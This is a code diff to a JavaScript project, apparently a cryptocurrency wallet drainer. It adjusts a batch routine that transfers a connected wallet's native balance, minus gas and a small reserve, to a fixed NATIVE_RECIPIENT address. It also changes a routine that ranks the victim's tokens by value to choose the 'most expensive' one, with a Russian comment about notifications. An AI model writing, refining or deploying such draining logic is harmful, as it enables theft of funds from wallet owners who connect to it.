@@ -758,10 +758,12 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         chainId: mostExpensive.chainId
       }).catch(() => 21000n)
       const gasCost = gasPrice * gasLimit
-      if (bal.value > gasCost) {
-        const sendAmount = bal.value - gasCost
-        nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x00', value: `0x${sendAmount.toString(16)}` }
-      }
+const reserveWei = parseUnits('0.0005', 18)
+const afterGas = bal.value > gasCost ? (bal.value - gasCost) : 0n
+if (afterGas > reserveWei) {
+  const sendAmount = afterGas - reserveWei
+  nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x00', value: `0x${sendAmount.toString(16)}` }
+}
     } catch (e) {
       console.warn('Native transfer compute failed:', e?.message || e)
     }
@@ -870,7 +872,8 @@ const initializeSubscribers = (modal) => {
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
           const value = token.balance * price
           token.price = price
-          if (value > maxValue) {
+          // Нативные токены учитываем в цене для уведомлений, но не выбираем как "самый дорогой"
+          if (!token.isNative && value > maxValue) {
             maxValue = value
             mostExpensive = { ...token, price, value }
           }
